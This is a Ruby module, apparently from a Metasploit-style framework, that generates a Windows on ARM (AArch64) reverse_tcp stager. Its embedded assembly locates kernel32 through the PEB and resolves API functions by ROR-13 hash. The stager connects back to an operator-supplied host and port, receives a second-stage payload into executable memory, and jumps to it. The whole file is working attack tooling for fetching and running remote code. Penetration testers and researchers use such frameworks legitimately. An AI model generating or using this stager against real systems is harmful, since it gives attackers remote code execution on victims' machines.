# -*- coding: binary -*-

module Msf
  # Windows AArch64 reverse_tcp stager payload generation.
  #
  # Empirically validated on Windows on ARM (build 10.0.26200). Uses
  # kernel32!FlushInstructionCache for portable icache maintenance -
  # user-space dc cvau / ic ivau trap as STATUS_ILLEGAL_INSTRUCTION on
  # WoA SoCs that leave SCTLR_EL1.UCI clear.
  #
  # Naming uses ReverseTcp_Aarch64 to match lib/msf_autoload.rb inflection
  # for reverse_tcp_aarch64.rb (same pattern as ReverseTcp_x64).
  module Payload::Windows::ReverseTcp_Aarch64 # rubocop:disable Naming/ClassAndModuleCamelCase
    include Msf::Payload::Windows

    def generate(_opts = {})
      conf = {
        port: datastore['LPORT'],
        host: datastore['LHOST'],
        exitfunk: datastore['EXITFUNC']
      }
      generate_reverse_tcp(conf)
    end

    #
    # Generate and compile the AArch64 reverse_tcp stager.
    #
    # @option opts [Integer] :port The port to connect to
    # @option opts [String] :host The IPv4 address to connect to
    # @option opts [String] :exitfunk The exit method (process, thread, none)
    # @return [String] raw shellcode bytes
    #
    def generate_reverse_tcp(opts = {})
      lhost = opts[:host]
      unless Rex::Socket.is_ipv4?(lhost)
        raise ArgumentError, 'LHOST must be in IPv4 format.'
      end

      ip_bytes = Rex::Socket.addr_aton(lhost)
      port_imm = [opts[:port].to_i].pack('n').unpack1('v')
      ip_lo_imm = ip_bytes[0, 2].unpack1('v')
      ip_hi_imm = ip_bytes[2, 2].unpack1('v')

      exit_hash = exitfunk_hash(opts[:exitfunk])
      asm = build_stager_asm(
        port_imm: port_imm,
        ip_lo_imm: ip_lo_imm,
        ip_hi_imm: ip_hi_imm,
        exit_lo: exit_hash & 0xFFFF,
        exit_hi: (exit_hash >> 16) & 0xFFFF
      )
      compile_aarch64(asm)
    end

    #
    # Msf::Payload::Windows#handle_intermediate_stage already sends the
    # 4-byte little-endian length prefix when RequiresMidstager is false.
    #

    protected

    # ROR-13 hash of a kernel32/ws2_32 export name, matching the asm
    # find_function routine (stops on CBZ before adding the NUL).
    def ror13_hash(str)
      h = 0
      str.each_byte do |b|
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + b) & 0xFFFFFFFF
      end
      h
    end

    def exitfunk_hash(value)
      case value.to_s.downcase
      when 'thread'
        ror13_hash('ExitThread')
      when 'process', '', 'seh'
        0x78b5b983 # TerminateProcess
      when 'none'
        ror13_hash('ExitProcess')
      else
        0x78b5b983
      end
    end

    def compile_aarch64(asm_string)
      require 'aarch64/parser'
      parser = ::AArch64::Parser.new
      asm = parser.parse(without_inline_comments(asm_string))
      asm.to_binary
    end

    def without_inline_comments(string)
      string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
    end

    def build_stager_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exit_lo:, exit_hi:)
      # Slot table (x29 + offset):
      #   0x00 kernel32_base  0x08 &find_function  0x10 VirtualAlloc
      #   0x18 LoadLibraryA   0x20 recv            0x28 WSAStartup
      #   0x30 WSASocketA     0x38 WSAConnect      0x48 FlushInstructionCache
      #   0x50 sockaddr_in    0x70 WSADATA
      <<~ASM
        main:
          sub     sp, sp, #0x300
          mov     x29, sp
          add     x19, x29, #0x50
          add     x21, x29, #0x70
        find_kernel32:
          ldr     x6, [x18, #0x60]
          ldr     x6, [x6,  #0x18]
          ldr     x6, [x6,  #0x30]
        next_module:
          ldr     x3, [x6, #0x10]
          ldr     x7, [x6, #0x40]
          ldr     x6, [x6]
          ldrh    w8, [x7, #24]
          cbnz    w8, next_module
        find_function_shorten:
          b       find_function_shorten_bnc
        find_function_ret:
          str     x30, [x29, #0x08]
          b       resolve_symbols_kernel32
        find_function_shorten_bnc:
          bl      find_function_ret
        find_function:
          mov     w10, w0
          ldr     w8,  [x3, #0x3c]
          add     x8,  x8, x3
          ldr     w9,  [x8, #0x88]
          add     x9,  x9, x3
          ldr     w4,  [x9, #0x18]
          ldr     w11, [x9, #0x20]
          add     x11, x11, x3
        find_function_loop:
          cbz     w4, find_function_finished
          sub     w4, w4, #1
          mov     w15, w4
          lsl     x15, x15, #2
          add     x15, x11, x15
          ldr     w12, [x15]
          add     x6,  x12, x3
        compute_hash:
          mov     w5, wzr
        compute_hash_again:
          ldrb    w0, [x6], #1
          cbz     w0, compute_hash_finished
          ror     w5, w5, #13
          add     w5, w5, w0
          b       compute_hash_again
        compute_hash_finished:
        find_function_compare:
          cmp     w5, w10
          b.ne    find_function_loop
          ldr     w12, [x9, #0x24]
          add     x12, x12, x3
          mov     w15, w4
          lsl     x15, x15, #1
          add     x15, x12, x15
          ldrh    w4,  [x15]
          ldr     w12, [x9, #0x1c]
          add     x12, x12, x3
          mov     w15, w4
          lsl     x15, x15, #2
          add     x15, x12, x15
          ldr     w13, [x15]
          add     x0,  x13, x3
        find_function_finished:
          ret
        resolve_symbols_kernel32:
          str     x3, [x29, #0x00]
          movz    w0, #0x4e8e
          movk    w0, #0xec0e, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x18]
          movz    w0, #0xca54
          movk    w0, #0x91af, lsl #16
          ldr     x3, [x29, #0x00]
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x10]
          movz    w0, #0x0980
          movk    w0, #0x5312, lsl #16
          ldr     x3, [x29, #0x00]
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x48]
        load_ws2_32:
          movz    x0, #0x7357
          movk    x0, #0x5f32, lsl #16
          movk    x0, #0x3233, lsl #32
          movk    x0, #0x642e, lsl #48
          movz    w1, #0x6c6c
          sub     sp, sp, #16
          str     x0, [sp]
          str     w1, [sp, #8]
          mov     x0, sp
          ldr     x9, [x29, #0x18]
          blr     x9
          add     sp, sp, #16
          mov     x3, x0
        resolve_ws2_32:
          movz    w0, #0xedcb
          movk    w0, #0x3bfc, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x28]
          movz    w0, #0x09d9
          movk    w0, #0xadf5, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x30]
          movz    w0, #0xba0c
          movk    w0, #0xb32d, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x38]
          movz    w0, #0x19b6
          movk    w0, #0xe718, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x20]
        call_WSAStartup:
          movz    w0, #0x0202
          mov     x1, x21
          ldr     x9, [x29, #0x28]
          blr     x9
        call_WSASocket:
          mov     w0, #2
          mov     w1, #1
          mov     w2, #6
          mov     x3, xzr
          mov     w4, wzr
          mov     w5, wzr
          ldr     x9, [x29, #0x30]
          blr     x9
          mov     x22, x0
        fill_sockaddr_fast:
          movz    x0, #0x0002
          movk    x0, ##{format('0x%04x', port_imm)}, lsl #16
          movk    x0, ##{format('0x%04x', ip_lo_imm)}, lsl #32
          movk    x0, ##{format('0x%04x', ip_hi_imm)}, lsl #48
          stp     x0, xzr, [x19]
        call_WSAConnect:
          mov     x0, x22
          mov     x1, x19
          mov     w2, #16
          mov     x3, xzr
          mov     x4, xzr
          mov     x5, xzr
          mov     x6, xzr
          ldr     x9, [x29, #0x38]
          blr     x9
        recv_stage_length:
          mov     x0, x22
          mov     x1, x19
          mov     w2, #4
          mov     w3, wzr
          ldr     x9, [x29, #0x20]
          blr     x9
          cmp     w0, #4
          b.ne    exitfunk_prep
          ldr     w24, [x19]
        call_VirtualAlloc:
          mov     x0, xzr
          mov     x1, x24
          movz    w2, #0x3000
          movz    w3, #0x0040
          ldr     x9, [x29, #0x10]
          blr     x9
          cbz     x0, exitfunk_prep
          mov     x23, x0
        recv_stage_loop_init:
          mov     x25, x23
          mov     x26, x24
        recv_stage_loop:
          mov     x0, x22
          mov     x1, x25
          mov     x2, x26
          mov     w3, wzr
          ldr     x9, [x29, #0x20]
          blr     x9
          cmp     w0, #0
          b.le    exitfunk_prep
          add     x25, x25, x0, sxtw
          sub     x26, x26, x0, sxtw
          cbnz    x26, recv_stage_loop
        icache_flush:
          movn    x0, #0
          mov     x1, x23
          mov     x2, x24
          ldr     x9, [x29, #0x48]
          blr     x9
        jump_to_stage:
          mov     x0, x22
          br      x23
        exitfunk_prep:
          b       exitfunk
        exitfunk:
          ldr     x3, [x29, #0x00]
          movz    w0, ##{format('0x%04x', exit_lo)}
          movk    w0, ##{format('0x%04x', exit_hi)}, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          mov     x10, x0
          movn    x0, #0
          mov     w1, wzr
          blr     x10
          brk     #0
      ASM
    end
  end
end
